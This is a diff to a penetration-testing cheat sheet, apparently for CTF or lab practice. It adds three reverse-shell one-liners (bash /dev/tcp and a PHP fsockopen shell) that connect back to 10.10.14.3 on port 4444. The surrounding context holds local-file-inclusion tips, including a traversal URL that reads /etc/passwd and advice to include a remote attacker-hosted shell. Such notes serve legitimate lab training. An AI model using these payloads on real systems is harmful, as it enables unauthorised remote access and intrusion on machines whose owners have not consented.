@@ -254,7 +254,6 @@ Apache
 phpLiteAdmin 1.9.3 Remote PHP Code Injection:
 * https://v3ded.github.io/ctf/zico2.html
 
-
 LFI / RFI
 (LFI = HIGH CHANCE OF RFI, SO TRY TO INCLUDE HTTP://ATTACKER/RSHELL.PHP)
 ```
@@ -267,6 +266,12 @@ http://example.com/index.php?page=../../../etc/passwd%00%en
 PHP
 * Check `phpinfo()`
 * RFI: If reverse-shell doesn't work, include `<?php phpinfo();?>` to check for banned functions
+* PHP reverse shell:
+```
+$ bash -i >& /dev/tcp/10.10.14.3/4444 0>&1
+$ /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'
+$ php -r '$sock=fsockopen("10.10.14.3",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
 
 Apache
 * Exposed `server-status` page: https://github.com/mazen160/server-status_PWN. Listen in to all requests by clients using this tool, including cookies.
